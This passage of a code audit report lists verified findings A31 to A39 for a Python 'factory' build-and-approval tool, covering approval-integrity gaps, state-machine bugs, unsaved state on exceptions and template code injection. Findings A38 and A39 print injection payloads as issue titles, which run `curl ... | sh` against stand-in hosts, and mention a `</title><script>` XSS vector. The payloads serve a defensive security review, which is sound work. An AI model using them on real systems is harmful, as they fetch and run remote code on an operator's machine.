The raisers the finding names are real: - EngineError: claudo.py:128-129 converts a plan-lint TimeoutExpired into EngineError. _do_plan calls _lint at foreman.py:763 outside any try, and _lint calls engine.lint_plan at 730. - subprocess.TimeoutExpired: claudo.py:219-229 trajectory() passes timeout=60 with no except, and foreman.py:1637 calls it unguarded. - ProjectError: commit_all (project.py:177-185) runs git through _git. _do_build_change guards only begin_change (956-959); commit_all at 965 and 985 is unguarded, and 985 runs after cost was added at 980. - TOMLDecodeError: tomllib.loads at foreman.py:1687 is unguarded.  ProjectError (project.py:37) and FactoryError (foreman.py:103) are separate classes; both subclass Exception directly. cli.py:559 catches ConfigError, RadarError, FactoryError, AgentError, EngineError, IdentityError and KeyError, so ProjectError, TimeoutExpired and TOMLDecodeError reach the user as raw tracebacks. EngineError is caught by the CLI, but the item is still not saved.  One detail is overstated: spec_review leads directly into design and then plan only when the design review is skipped (_advance, 353-357). Otherwise the plan-lint case happens after a design_review approval, with the same loss. The defect stands either way.
2. I read the code and it confirms the finding. In run() (foreman.py:300-348), the only store.save on the stage path is the final one at 348. The early-exit saves at 308, 441 and 446 do not cover exceptions, and there is no try/finally around `handler(item)`. approve() appends the approval and logs it (around 451-455), then calls `self._advance(item)` and `return self.run(item)` without saving first. The raisers propagate as described. Claudo.lint_plan turns a timeout into EngineError (claudo.py, 'plan-lint timed out'). _lint calls it with no try, and _do_plan calls _lint (foreman.py ~773). Claudo.trajectory calls subprocess.run(timeout=...) without catching TimeoutExpired. _trajectory_gate calls it directly, and gates.run_gates (gates.py:156-157) calls extra gates without a try. _do_build_change calls commit_all at ~1005 and ~1026 outside any try. commit_all goes through _git_raw, which raises ProjectError (project.py:65), and ProjectError subclasses plain Exception (project.py:37), not FactoryError. golden_gate_commands calls tomllib.loads without a try. cli.main catches only ConfigError, RadarError, FactoryError, AgentError, EngineError, IdentityError and KeyError, so ProjectError, TimeoutExpired and TOMLDecodeError surface as raw tracebacks. In every case the in-memory approval, cost_usd and build_attempts are never persisted. Some line numbers in the finding are a little off: cost_usd += is at ~1021, not 980, and the save is at 348, not 347. The mechanism and failure scenarios are still accurate.

### A31. Non-git app: nothing checks the tree between gating and IT approval, and the seal commits whatever is there

- **Location:** `src/factory/foreman.py:461` · **category:** integrity · **found:** medium · **verified:** medium · **finder:** foreman
- **Failure scenario:** A POC app (single agent, no git) passes its gates. Before ship approval, files in apps/<slug> are edited (by hand or by a leftover process). IT approves, the edited tree is committed and recorded as approved_head, and `publish` accepts it as approved.
- **Suggested fix:** At gate time, record a content hash of the tree for non-git apps (or git-init and commit at gate time) and compare it in _check_gated_head.

**Evidence**

> _check_gated_head returns early `if not item.gated_sha` (461), and gated_sha is '' when the app has no .git (head_sha, project.py:372-373). _seal_approved_head then runs prepare_project + commit_leftovers on the current tree (483-486). The docstring claims it commits 'the very tree the gates judged'. prepare_project may also write a justfile (project.py:86-95), changing the tree.

**Skeptic notes**

1. I could not refute this; the code confirms it. In foreman.py, gates_pass sets `item.gated_sha = ""` at line 1659 and then `item.gated_sha = head_sha(app)` at line 1675. head_sha returns "" when the app has no .git (project.py, `if not (app / ".git").exists(): return ""`). So a POC app built outside git keeps gated_sha empty. _check_gated_head (foreman.py:458-475) returns early at line 461 when `not item.gated_sha`, so neither the HEAD comparison nor the porcelain dirty check runs for such an app. _clean_tree_gate (1455-1462) is also skipped ("not applicable: the app is not a git project"). No content hash or snapshot of the gated tree is recorded anywhere: the only references to gated_sha are at lines 461-465, 483, 1575-1577, 1659 and 1675. _seal_approved_head (477-486) then runs prepare_project plus commit_leftovers on whatever tree is present at approval time, and records that as approved_head. The publish check at lines 1061-1073 only compares the branch tip to approved_head, so it accepts the result. The docstring claim "as the very tree the gates judged" is therefore not enforced: edits made to apps/<slug> between the gates and the IT approval get committed and approved without being gated. Exploiting it needs write access to the app directory during that window, which is exactly what the guard is meant to catch for git apps. Medium severity is reasonable.
2. I read the code and it confirms the finding. In src/factory/foreman.py:461, `_check_gated_head` returns early when `not item.gated_sha`. `gated_sha` is set at foreman.py:1675 via `head_sha(app)`, which returns "" when the app has no own .git (project.py, in `head_sha`: `if not (app / ".git").exists(): return ""`). A non-git app can pass all gates: `_clean_tree_gate` returns ok with "not applicable: the app is not a git project" (foreman.py:1458-1459). At ship_review approval, foreman.py:434 runs the check, which is a no-op for such an app. foreman.py:448 then calls `_seal_approved_head`, and at 483-486 that runs `prepare_project(app)` and `commit_leftovers(app, item.slug)` on whatever tree is present, then records `approved_head = head_sha(app)`. Nothing records a hash of the gated tree. The docstring's claim ("the very tree the gates judged", comment "the tree IS what was gated") is an assumption the code never verifies. For git apps the same situation is explicitly refused (head mismatch, or a dirty porcelain at 463-474), so the lack of protection for non-git apps is a real integrity gap, not a documented exemption. The repo tests I grepped (test_post_approval.py) only cover git and branch cases, not a non-git edit between gating and approval. Exploiting it requires someone or something with write access to apps/<slug> during the review window. That limits severity but is the same threat the git-path check exists to block, so medium stands.

### A32. For non-git apps (POV/POC, or MVP without Claudo), approval commits whatever is on disk with no post-gate check

- **Location:** `src/factory/foreman.py:461` · **category:** approval-integrity · **found:** medium · **verified:** medium · **finder:** claims
- **Failure scenario:** POC single-agent build, gates pass. Before IT approves, someone or a lingering process adds `import flask` and a hardcoded key to app/main.py. `factory approve x --as it` succeeds, and the ungated edit becomes the approved commit. publish only catches the key (history scan), never the radar violation.
- **Suggested fix:** For non-git apps, record a content hash of the gated tree in _do_gate (or git-init and commit before gating) and refuse approval when it differs.

**Evidence**

> _check_gated_head returns immediately when `not item.gated_sha` (461-462), and gated_sha is '' for an app that is not a git repo (head_sha, project.py:372-373). _seal_approved_head then runs prepare_project + commit_leftovers and records approved_head (483-486). README.md:202-203: 'IT's approval is refused if the app moved since'.

**Skeptic notes**

1. I could not refute this; the code says what the finding claims. In foreman.py, _do_gate (1640-1677) first sets item.gated_sha = "" (1659). After the gates pass it sets it to head_sha(app) (1675). For an app that is not a git repo, head_sha returns '' because `git rev-parse --verify -q HEAD` fails. So gated_sha stays empty. At ship_review, approve() calls _check_gated_head (433-434). That check returns at once when `not item.gated_sha` (461-462), so neither the HEAD comparison nor the porcelain() dirty check runs. _seal_approved_head (478-487) then runs prepare_project and commit_leftovers on whatever tree is on disk and records it as approved_head. Nothing hashes or snapshots the gated tree for this case. The docstrings at 478-479 and 1091 confirm that single-agent POC builds happen outside git. ship_review applies to every item (workitem.py:36, "always human"). The README promises that 'IT's approval is refused if app moved since', and that holds only for git apps. Once sealed, the edit counts as approved, so publish's later tip/dirty checks pass. I did not check the claim that publish catches only secrets; it does not change the core defect. Severity: medium. Exploiting it needs a local write between gating and approval, but it is a real gap in the approval-integrity guarantee the README states.
2. I could not refute it; the code confirms the gap. foreman.py:1675 sets `item.gated_sha = head_sha(app)`, and head_sha returns "" when the app has no own .git (project.py:372-373). At approval, `_check_gated_head` returns early on `not item.gated_sha` (foreman.py:461-462), so neither the HEAD comparison (463) nor the porcelain/dirty check (472) runs. `_seal_approved_head` (477-486) then runs prepare_project + commit_leftovers on whatever is on disk and records that as approved_head. The comment at 483, "the tree IS what was gated", is an assumption that nothing enforces: no hash of the gated tree is recorded anywhere. The only gated_sha assignments are 1575-1577, 1659 and 1675. The docstring at 478 confirms that single-agent builds outside git are a supported path. README.md lines 202-203 promise that "IT's approval is refused if the app moved since", which does not hold for this path. Same threat model as the git check: an edit made on disk between the gates and IT's approval is sealed as the approved commit without being gated. It needs local write access during that window, so medium (not high) is fair.

### A33. promote() ignores an open change: the rebuilt app lands on the change's branch

- **Location:** `src/factory/foreman.py:542` · **category:** state-machine · **found:** medium · **verified:** medium · **finder:** foreman
- **Failure scenario:** App A has an open feature change F (checked out on factory/F). IT promotes A to MVP. The app's status leaves 'shipped', so F's next run is blocked by _shipped_target (302-308). A's MVP rebuild and Claudo commits go onto factory/F, so the change PR would carry the promotion rebuild, while `publish A` pushes the base branch without it (1093-1096).
- **Suggested fix:** In promote(), refuse while any change_open item targets this app (same message as intake_change).

**Evidence**

> promote() (542-558) checks role, kind, stage and maturity, then sets stage='design', status='active' and runs. Nothing checks for a change_open on this app (intake_change does at 272-274). begin_change leaves the app checked out on factory/<change> (project.py:258/268). _do_build for an app builds in app_dir with no branch switch (1352-1378).

**Skeptic notes**

1. I could not refute it, and the code I read confirms it. promote() (foreman.py:542-558) checks role, kind, stage and maturity, then sets stage='design', status='active' and calls run(). It never checks for change_open, unlike intake_change (272-274) and open_migration (291). change_open (workitem.py:113-115) stays true until the change is merged or abandoned. begin_change (project.py) switches the app to factory/<slug> and does not switch back, so after a change build the app stays on that branch. For an app, _do_build (1340-1371) calls _scaffold and _build_with_claudo or the builder with cwd=app, and none of them switch branches. So the promoted app's rebuild is committed on factory/F. While A is not shipped, F's run() is blocked by _shipped_target (302-308). _publish_app (1092-1096) publishes open_change.base_branch when HEAD is on factory/*, so the promotion rebuild is left out of the publish. No test covers promoting an app that has an open change (tests/test_change_flow.py:347, test_foreman.py:104, test_identity.py:77). Medium severity is fair: it needs a change to be open at the moment IT promotes, and it causes cross-contaminated branches rather than data loss.
2. I could not refute this finding; the code I read confirms it. In foreman.py, promote() (lines 542-558) checks the role, that kind == 'app', that stage == 'shipped' and the maturity order. It then sets stage='design' and status='active' and calls run(). It never looks at change_open. intake_change (272-274) and open_migration (291) do refuse when a change is open. run() only calls _shipped_target for non-app items, so the promoted app goes straight to its build. _do_build (around 1340-1380) builds an app in app_dir with no branch switch, and _build_with_claudo (1471+) only runs prepare_project. Meanwhile begin_change in project.py (249-270) runs `git switch -c factory/<slug>` and leaves the app on that branch until merge_fast_forward or abandon_change. So the promotion rebuild lands on factory/<change>. The pending change's next run is also blocked, because _shipped_target (around 257) requires the app's status to be 'shipped' and promote has set it to 'active'. In _publish_app (1092-1096), when the current branch is factory/*, publish pushes the open change's base_branch, which does not contain the rebuild. workitem.py:113-115 defines change_open as kind != app, not merged and not abandoned. No test covers promote with an open change (tests/test_change_flow.py:347 and tests/test_foreman.py:104 do not), and the README:104 says nothing about this case. The scenario needs IT to promote while a change is open, which is a plausible order of operations. Medium severity holds.

### A34. promote rebuilds an app while a change is in flight, writing onto the change branch

- **Location:** `src/factory/foreman.py:542` · **category:** state-machine · **found:** medium · **verified:** medium · **finder:** claims
- **Failure scenario:** App `orders` has change `add-csv` built on branch factory/add-csv. IT runs `factory promote orders --to mvp`. The new design, plan and build scaffold and commit into the working tree on factory/add-csv (Claudo task commits land on the change branch), mixing the promotion rebuild into the change's PR. The change then blocks because its target is no longer shipped.
- **Suggested fix:** Refuse promote while any item has change_open and target == item.slug.

**Evidence**

> promote (542-558) checks role, kind, stage and maturity order, then sets stage='design' and calls run(). Unlike intake_change (272-274) it never checks for an open change. _do_build then writes into apps/<slug> (app_dir, 891), which is checked out on factory/<change> while a change is open.

**Skeptic notes**

1. I could not refute this finding; the code confirms it. `promote` (foreman.py:542-558) checks role, kind, stage == shipped and maturity order. It then sets stage='design' and status='active' and calls run(). Nothing in it looks for an open change. `intake_change` (272-274) and `open_migration` (291) do refuse when `i.change_open and i.target == target`; their comment says changes "share one git branch space". `app_dir` (889-891) points both the app and its changes at the same folder, apps/<slug>. `begin_change` (project.py:249-270) runs `git switch -c factory/<slug>`, and nothing switches back until `merge_fast_forward` (282) or `abandon_change` (320-321). So while a change is open, the app's working tree stays on factory/<change>. The promoted app's `_do_build` (foreman.py ~1352 onward) scaffolds and runs the build agent or Claudo with cwd=app, so its work and commits land on the change branch. After the promotion, the app's status is 'active', not 'shipped'. The change's next run() calls `_shipped_target` (304), which raises "is not a shipped app", and the change is marked blocked, as the finding says. The CLI `cmd_promote` (cli.py:227-231) adds no guard either. Some damage is delayed: design probably reaches a human checkpoint before the build runs, so nothing is written right away. The state-machine defect is still real, and medium severity fits.
2. I confirmed this from the code. `promote` (src/factory/foreman.py:542-558) checks the role, that the item is an app, that it is shipped, and the maturity order. It then sets stage='design' and status='active' and calls `run()`. It never looks for an open change on the app. `intake_change` does refuse that case (foreman.py:272-274), with the comment "one change at a time per app: they share one git branch space". `_publish_app` also handles it: at 1092-1096 it detects a checked-out `factory/` branch and falls back to the change's base branch. `promote` has neither guard.  `begin_change` (src/factory/project.py:249-270) runs `git switch` to put `apps/<target>` on `factory/<slug>`. While a change is open (workitem.py:113-115, meaning not merged and not abandoned), the tree stays on that branch. Only `merge_fast_forward` (project.py:273-292) and `abandon_change` (project.py:312-322) switch back to the base.  The app's own rebuild uses `app_dir` = `apps/<slug>` (foreman.py:889-891). `_do_build` (1340-1379) scaffolds into that folder and copies the triplet there without switching branch. It then either runs a build agent in it or, via `_build_with_claudo` (1471-1514), runs `prepare_project` and `engine.run_build` and commits the leftovers. All of these commits land on whatever branch is checked out, which here is `factory/<change>`. So the promotion rebuild mixes into the change's branch and PR.  cli.py:227-231 `cmd_promote` adds no guard either. I did not trace the second half of the scenario, the change blocking because its target is no longer shipped. The main defect stands without it. Severity medium is fair: the build only runs after the design and plan checkpoints, but nothing stops it from running.

### A35. promote() keeps Claudo run state, acks and review from the previous rung

- **Location:** `src/factory/foreman.py:555` · **category:** state-machine · **found:** medium · **verified:** medium · **finder:** foreman
- **Failure scenario:** Promote MVP to prod: the new approved plan reuses task ids T1..Tn and CP-1. All of them are already done or consumed in state.json, so the orchestrator can finish 'done' without building anything new. claudo_cp then becomes '' (1512) and the trajectory gate reports 'not applicable'. Separately, an 'unsafe_host' ack from the POC host build keeps forcing a --note at the sandboxed MVP ship review. (The resume behaviour is inferred from the docstring; Claudo itself was not read.)
- **Suggested fix:** On promote, reset ship_acks, claudo_review, claudo_cp, claudo_cp_consumed, gated_sha and approved_review_sha256, and archive or remove work/<slug>/.runs/state.json (or start a new feature dir per rung).

**Evidence**

> promote resets only it_exceptions and exception_terms (555). ship_acks are reset only when build_attempts <= 1 (1341-1344), but build_attempts already counts the earlier builds. Claudo's state for work/<slug>/.runs/state.json in the same app dir is not cleared. Per claudo.py:143-146, a later run 'resumes where it paused (finished tasks are skipped)', and reopen_checkpoint shows state is keyed by node id (claudo.py:283-286).

**Skeptic notes**

1. Partly confirmed from the code. promote() at src/factory/foreman.py:542-557 resets only it_exceptions/exception_terms (555), stage and status. build_attempts is only ever incremented (329) and is never reset anywhere in foreman.py. So after a promote, _do_build's reset `if item.build_attempts <= 1: item.ship_acks = []` (1341-1344) never fires again. ship_acks from the previous rung survive: for example "unsafe_host", added at 1345-1349 during a POC host build. The ship-review approval at 420-431 turns every ship_ack into a reason, raises FactoryError unless --note is given, and lists the stale ack under "Needs IT attention" in the report (1158-1159). That part is a real stale-state defect. The Claudo half of the finding is not demonstrated. claudo_cp is already cleared at ship approval (1591, 449), and claudo_rejection is consumed, so promote does not leak a pending checkpoint. claudo_review is overwritten at the next pause (1505-1507). The claim that a reused state.json makes the orchestrator finish 'done' without building rests only on the run_build docstring in claudo.py ('later resumes where it paused (finished tasks skipped)'). Claudo's own code is outside this repo and I did not read it. The factory gates also run after the build step regardless. tests/test_foreman.py:99-106 only checks that promote reaches design_review, so no test covers either behavior. Net: the stale ship_acks are confirmed. The 'builds nothing' scenario is speculative. The impact I can confirm is a spurious forced --note and misleading IT-attention lines, so severity is lowered.
2. I couldn't refute it. One half is proven from foreman.py; the other half rests on Claudo's docstring, because Claudo's own source wasn't readable (the antoinelef23/Claudo contents API returned 404).  Proven from code: - `promote()` at src/factory/foreman.py:542-558 resets only `maturity`, `it_exceptions`/`exception_terms` (555), `stage` and `status`, then calls `run()`. - `run()` increments `build_attempts` (foreman.py:329) and nothing resets it on promote. - So in `_do_build`, the `if item.build_attempts <= 1: item.ship_acks = []` branch is skipped after a promotion. - Acks from the earlier rung survive, for example `unsafe_host` from a POC host build. At the new ship review, foreman.py:427 turns every remaining ack into a reason and raises unless IT passes `--note`. - `claudo_review` is also not reset. If the new Claudo run ends 'done' with no checkpoint, the old verdict stays, and a stale WARN would also force a note (foreman.py:423).  Plausible, inferred from documented behaviour: - Nothing in foreman.py deletes or archives `work/<slug>/.runs/state.json`. A grep for runs/state.json/rmtree/unlink found no reset. - After a ship, `claudo_cp` is '' (foreman.py:1591), so the promoted build goes back through `_build_with_claudo` (1497) on the same `work/<slug>` with the old state. - `_copy_triplet` and `merge_plan_copy` (project.py:484) even carry the previous rung's run log into the new plan. - claudo.py `run_build`'s docstring (lines 143-146) says a later run 'resumes where it paused (finished tasks are skipped)'. `reopen_checkpoint` (claudo.py:277-288) shows state is keyed by checkpoint id. - So on MVP to prod (`claudo_build_from` defaults to 'mvp', config.py:47), a new plan that reuses T1..Tn and CP-1 would plausibly be skipped as already done.  Tests: test_foreman.py:104 tests promote only up to design_review, and no test covers acks or run state across a promotion.  Severity medium stands. The ack carry-over is certain but low impact (it forces a note). The stale run state skipping the new build is the more serious part, but it is inferred from the docstring, not from Claudo's code.

### A36. An EngineError (plan-lint timeout) aborts run() unsaved: the approval, history and billed agent cost are lost

- **Location:** `src/factory/foreman.py:739` · **category:** error-handling · **found:** medium · **verified:** medium · **finder:** gap4-llm-artifact-retry-loops
- **Failure scenario:** The business approves spec_review. design runs, then the plan agent runs (cost added to item.cost_usd in _ask_agent:579), then Claudo plan-lint times out. The exit code is 2 and item.json is unchanged: still spec_review/waiting, without the approval, the spec hash or the plan agent's cost. The human must approve again, which pays for the plan agent a second time, and cost telemetry under-reports.
- **Suggested fix:** Catch EngineError in _do_plan and return (False, msg) so run() blocks and saves, or save the item in a finally block in run()/approve().

**Evidence**

> _lint calls `self.engine.lint_plan(...)` with no try. lint_plan raises `EngineError(f"plan-lint timed out after {timeout}s")` (claudo.py:129). run() saves only at the end (`self.store.save(item)` 356). approve() records hashes and approvals, then calls `self.run(item)` (465) without saving first. The CLI catches EngineError and returns 2 (cli.py:559-562).

**Skeptic notes**

1. I could not refute the finding. Every link in the chain shows in code I read remotely.  1. claudo.py:129: `lint_plan` turns `subprocess.TimeoutExpired` into `EngineError("plan-lint timed out after {timeout}s")`. The default timeout is 60 s. 2. foreman.py:733-747: `_lint` calls `self.engine.lint_plan(...)` (line 739) with no try. 3. foreman.py:772: `_do_plan` calls `self._lint(item, text)` with no try. Line 770 calls `_ask_agent` just before it, and `_ask_agent` adds `result.cost_usd` to `item.cost_usd` at line 579. 4. foreman.py:309-356: `run()` calls `handler(item)` with no try. It saves only on the early `kind != "app"` path (line 316) and after the loop (line 356). 5. foreman.py:411-465: `approve()` mutates the item in memory before calling `self.run(item)` at line 465 with no save first. It records hashes (`_record_hash` for `spec.md`/`design.md`), design-review exceptions, the `approvals` entry and the log. The only saves in `approve` are in the ship_review `blocked`/`redecide` branches. 6. cli.py:201-205: `cmd_approve` has no handler. cli.py:559-562 catches `EngineError`, prints it and returns 2.  So the scenario holds. The plan stage follows an approval at `design_review`, or comes straight after `design` when `design_review` is skipped (foreman.py:362-365). A plan-lint timeout there exits with code 2 and leaves item.json at the previous checkpoint. The approval, the frozen hash and the plan agent's billed cost are all lost. Re-approving pays for the agent again.  Small caveat: files written to disk before the timeout (`design.md` and any judge outputs) do persist; only the item state is lost. The defect is real error handling, not style, and medium severity fits: it needs a timeout, but it loses an audit record and billed cost.
2. I read the code remotely and it does what the finding says. In foreman.py, _do_plan (749) calls `self._lint(item, text)` (772) with no try. _lint (733) calls `self.engine.lint_plan(...)` at 739 whenever an engine is configured (cli.py:30 builds `ClaudoEngine(home)` when a Claudo home exists). claudo.py lint_plan turns `subprocess.TimeoutExpired` into `raise EngineError(f"plan-lint timed out after {timeout}s")`, with a 60 s default. Nothing catches EngineError anywhere in foreman.py: run() catches only FactoryError, and only around `_shipped_target`. So the exception escapes the handler loop, and run() never reaches `self.store.save(item)` at 356. approve() appends the approval, logs it, calls `_advance`, then `return self.run(item)` (465) without saving first. cli.py:559-562 catches EngineError and returns 2. The scenario holds: the plan agent's cost is added to `item.cost_usd` in _ask_agent (579), but item.json keeps the pre-approval state (spec_review/waiting, no approval, no hash). The approve has to be redone, which re-runs design and pays for the plan agent again. The trigger needs a plan-lint timeout, which is rare, so medium severity is reasonable.

### A37. The scope heuristic consumes plan-lint retries and can discard a lint-clean plan, then block

- **Location:** `src/factory/foreman.py:776` · **category:** correctness · **found:** medium · **verified:** medium · **finder:** gap4-llm-artifact-retry-loops
- **Failure scenario:** plan_lint_retries=2. Attempt 1: lint ok + 'T2: the prompt changes app/x.py but files_touched does not list it'. Attempt 2: same. Attempt 3: the agent breaks the DAG, so a lint error. The item is blocked at plan with 'rejected by Claudo plan-lint (3 attempt(s))' although attempts 1 and 2 were valid plans.
- **Suggested fix:** Remember the last lint-ok attempt. On exhaustion with errors, fall back to it (with its scope warnings as notes) instead of blocking.

**Evidence**

> `if lint.ok and (self.runner is None or tries >= self.cfg.plan_lint_retries): break` only accepts a scope-warning-only plan once retries are exhausted. Before that, a lint-OK plan with a scope warning is re-prompted (782-791) and the previous text is dropped. If the next attempt has a real lint error and the retries are spent, line 778 blocks. This contradicts the comment at 744 ('it never blocks a plan') and the one at 777. No best/previous-clean attempt is kept.

**Skeptic notes**

1. I read the code and it behaves as the finding says. In src/factory/foreman.py, the loop in _do_plan (lines 773-791) accepts a lint-ok plan that still has a "files_touched does not list it" scope warning only once tries >= plan_lint_retries (line 776). Before that point it re-prompts (782-791) and keeps only the latest `text`; no earlier lint-ok attempt is saved anywhere. With the default plan_lint_retries=2 (config.py:36,110; factory.toml:84) the sequence goes like this: - attempt 1 is lint-ok with a scope warning, tries goes 0 to 1; - attempt 2 is the same, tries goes 1 to 2; - attempt 3 has a real lint error, and line 778 returns "plan rejected by Claudo plan-lint (3 attempt(s))" and writes only the failing text (779). The two earlier lint-clean plans are lost, so a heuristic warning ends up causing a block. That contradicts the comment at 744 ("it never blocks a plan") and the one at 777.  The tests confirm that re-prompting on scope warnings is intended: tests/test_gates_blind_spots.py:424 asserts 1+retries prompts. No test I found covers this particular sequence, where a clean plan is followed by a regressed one. The regressed plan is also genuinely invalid when it is blocked. The block only happens if the agent regresses on a retry, so I would rate this low rather than medium. It is still a real correctness gap: the fallback to the last lint-ok attempt is missing.
2. I couldn't refute the finding. I read src/factory/foreman.py:744-800 from the remote repo. Line 773 builds `scope` from the warnings that contain 'files_touched does not list it'. Line 776 accepts a lint-ok plan that only has scope warnings, but only once `tries >= plan_lint_retries`. Before that point, execution reaches line 782 (`tries += 1`) and lines 788-791 re-prompt the agent. The previous `text` is kept only as feedback inside the prompt. It is never stored as a fallback.  Trace with plan_lint_retries=2: - Attempt 1 (tries=0): lint ok, scope warning. Line 776 and line 778 are both false, so tries becomes 1 and the agent is re-prompted. - Attempt 2 (tries=1): same result, so tries becomes 2. - Attempt 3 (tries=2): the plan has a real lint error. Line 776 is false because lint is not ok. Line 778 is true, so lines 779-781 write the bad text and return False with 'plan rejected by Claudo plan-lint (3 attempt(s))'.  The item is blocked even though attempts 1 and 2 were lint-clean. No earlier clean attempt is kept anywhere in the loop. This contradicts the comment at line 744 ('it never blocks a plan') and the one at line 777. The block depends on the agent getting worse on a later attempt, so the scenario is plausible rather than certain. Medium severity stands.

### A38. Item title is pasted unescaped into golden-path Python/TS/TOML sources, so the gates then run attacker code on the host

- **Location:** `src/factory/foreman.py:935` · **category:** code-injection · **found:** high · **verified:** medium · **finder:** security
- **Failure scenario:** Someone files an intake issue titled `x"+__import__('os').system('curl evil|sh')+"`. `factory inbox` turns it into an item. After the spec and plan approvals, _scaffold writes `FastAPI(title="x"+__import__('os').system(...)+"")` into apps/<slug>/app/main.py, and `uv run pytest` imports it on the operator's machine, outside any sandbox. A title containing `"` alone is enough to break the generated app.
- **Suggested fix:** Escape per target language (json.dumps for Python/TS string literals, a TOML basic-string escaper for pyproject) or restrict titles to a safe character set before substitution; never let free text reach code templates raw.

**Evidence**

> foreman.py:935 `values = {"{{slug}}": item.slug, "{{title}}": item.title, ...}` and :946-948 `text = text.replace(k, v)` with no escaping. golden_paths/python-fastapi/app/main.py:7 `app = FastAPI(title="{{title}}")` (the same in fullstack-react/app/main.py:9, web/src/App.tsx:5 `const TITLE = "{{title}}";`, pyproject.toml:4 `description = "{{title}}"`). The title comes from `factory intake` or, through `inbox`, from a GitHub issue title (foreman.py:183-185). With runner offline, _containment sets build_where="" (foreman.py:1385-1387), so _gate_executor returns the host shell_executor (foreman.py:1415-1419, gates.py:68-73 shell=True), and the POC `tests` gate (factory.toml:100) imports app.main.

**Skeptic notes**

1. I confirmed the bug from the code, but the line number is off. In the current main branch, foreman.py:974 (not 935) builds `values = {"{{slug}}": item.slug, "{{title}}": item.title, ...}`. The `_scaffold` loop then runs `text.replace(k, v)` with no escaping on every TEXT_SUFFIXES file.  The templates put `{{title}}` straight into code: - golden_paths/python-fastapi/app/main.py:7 `app = FastAPI(title="{{title}}")` - golden_paths/fullstack-react/web/src/App.tsx:5 `const TITLE = "{{title}}";` - golden_paths/python-fastapi/pyproject.toml:4 `description = "{{title}}"`  The title is never validated. `intake` (foreman.py:145-152) only checks that it is non-empty and strips it. `inbox` (foreman.py:183-185) passes `issue["title"]` straight through, and `_issue_refusal` only checks for an empty title and the author's role.  The path to host execution is real: - When `runner` is None, `_containment` sets `build_where = ""`. - When `sandbox` is None, or a POV/POC build runs while the sandbox is not ready, it sets `build_where = "host"`. - In every case other than "sandbox", `_gate_executor` returns `self.executor`, the host `shell_executor`. - `run_gates` (foreman.py:1700-1712) runs the gate commands in that executor against the scaffolded app.  A title containing a single `"` is enough to make the generated main.py a syntax error. A crafted title runs code when the tests import the module.  Two things argue for medium rather than high: - When an identity provider is configured, an issue is only accepted if its author holds the business role (`_issue_refusal`). - In the same host-fallback modes, the build agent already runs code on the host, driven by the issue body.  Even so, the title injection is deterministic. It skips the LLM entirely, and the human spec and plan approvals never show it.
2. I could not refute this. The code I read confirms the mechanism. foreman.py:935 builds `values` with the raw `item.title`, and :946-948 does a plain `text.replace(k, v)` on every file whose suffix is in TEXT_SUFFIXES. The only check on the title happens at intake: foreman.py:148 and :197-198 reject a blank title, and :152 strips whitespace. Nothing escapes it. In golden_paths/python-fastapi, app/main.py:7 has `app = FastAPI(title="{{title}}")`, line 1 has `"""{{title}}: ..."""` and pyproject.toml:4 has `description = "{{title}}"`. So a title with a `"` breaks the scaffolded app, and a crafted title becomes valid Python code. Issue titles reach `intake` through foreman.py:183-185. The gates run on the host in two cases: no sandbox is configured (_containment, :1385-1390), or a pov/poc is built while the sandbox is not ready (:1394-1400). _gate_executor (:1415-1419) then returns self.executor.  I lower the severity to medium for three reasons. First, when an identity is configured, _issue_refusal (:199-200) only accepts issues from holders of the business role. Second, the item has to pass human spec and plan approvals before the scaffold runs. Third, that same requester already controls the idea text, which drives an LLM build agent that writes code later run on the same host. The extra attack surface is real, and the `"` breakage is a plain correctness bug, but this is not an unauthenticated jump to code execution. I did not read gates.py or factory.toml to confirm the finder's other citations.

### A39. Issue title is pasted raw into golden-path Python source, then run on the host by the tests gate (code injection from an issue)

- **Location:** `src/factory/foreman.py:935` · **category:** security · **found:** high · **verified:** medium · **finder:** gap3-inbox-issue-to-workitem
- **Failure scenario:** Issue labelled `factory` titled `Expense log", openapi_url=None); __import__("os").system("curl -s https://x.example/p|sh"); app2 = FastAPI(title="` (well under GitHub's 256-char cap). It is imported as a poc app; after the three checkpoints (reviewers read the spec, not the title as code) `factory run` scaffolds app/main.py line 7 with that text, and the tests gate imports app.main on the host, executing the command. A title with `"""` breaks out of the docstring at line 1 the same way. The same raw substitution puts `</title><script>...` into web/index.html:6 of the fullstack-react path (stored XSS in the delivered app).
- **Suggested fix:** Do not substitute free text into code: escape per target (json.dumps for Python/TOML/JSON string literals, html.escape for HTML), or only substitute the slug and load the title from a data file at runtime. Reject titles containing quotes/backslashes/newline-like characters at intake as a minimum.

**Evidence**

> foreman.py:183-184 passes issue["title"] straight to intake(); workitem stores title.strip() (foreman.py:152). _scaffold does `values = {"{{slug}}": item.slug, "{{title}}": item.title, ...}` and `text.replace(k, v)` (foreman.py:935,946-947) with no escaping. golden_paths/python-fastapi/app/main.py:1 is `"""{{title}}: service entry point ..."""` and :7 is `app = FastAPI(title="{{title}}")` (same in fullstack-react/app/main.py:1,9; python-worker/worker/__init__.py:1). The golden test golden_paths/python-fastapi/tests/test_health.py:4 does `from app.main import app`. With the offline runner (get_runner returns None, agents.py:135-136) _containment sets build_where = "" (foreman.py:1385-1387) and _gate_executor returns self.executor (foreman.py:1415-1419), i.e. shell_executor on the host; poc gates include "tests".

**Skeptic notes**

1. I read the code on main remotely and it confirms the finding. Note that the scaffold code sits at foreman.py:975-998 on main, not at line 935. The path is as follows. - **Intake:** inbox() passes issue["title"] to intake(), and intake() stores title.strip() (foreman.py:183-188, 152-162). - **Only checks at intake:** _issue_refusal (foreman.py:205-210) rejects only an empty title, and an author without the business role when identity is on. It does not check characters. - **Raw substitution:** _scaffold builds `values = {"{{slug}}": item.slug, "{{title}}": item.title, ...}` and calls text.replace(k, v) with no escaping. It does this for every file whose suffix is in TEXT_SUFFIXES, which includes .py and .html (foreman.py:116-119, 992-995). - **Injection point:** golden_paths/python-fastapi/app/main.py:7 is `app = FastAPI(title="{{title}}")`, and line 1 is a `"""{{title}}: ..."""` docstring. tests/test_health.py:4 does `from app.main import app`. - **Where the tests run:** the CLI builds a Foreman whose executor defaults to shell_executor (foreman.py:129, 142; cli.py:40-51). The default runner is "offline" (factory.toml:12). With no runner, _containment sets build_where = "" (foreman.py:1457-1459). _gate_executor then returns self.executor, not the sandbox executor (foreman.py:1490-1494), so the gates run on the host. - **Tests gate at poc:** poc gates include "tests", run as `uv run --quiet pytest -q` (factory.toml:100, 106), and poc is the default maturity for an issue (foreman.py:218).  So a crafted title in a `factory` issue is pasted into app/main.py, and pytest imports it on the host. Two things limit exploitation, but neither is a guard in the code: the item must pass the human checkpoints (where the title is visible), and GitHub only lets triage-level users add labels unless 